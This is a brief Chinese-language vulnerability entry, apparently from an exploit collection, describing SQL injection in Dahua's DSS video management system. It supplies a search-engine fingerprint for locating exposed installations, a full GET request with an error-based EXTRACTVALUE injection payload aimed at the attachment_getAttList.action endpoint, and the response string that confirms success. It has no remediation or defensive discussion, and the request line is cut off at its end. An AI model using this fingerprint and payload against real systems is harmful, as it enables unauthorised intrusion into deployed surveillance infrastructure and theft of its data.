# 大华DSS视频管理系统sql注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`hunter：app.name="Dahua大华 DSS 视频管理系统"`
- **请求**：`GET /portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTT`
- **响应特征**：-1 XPATH syntax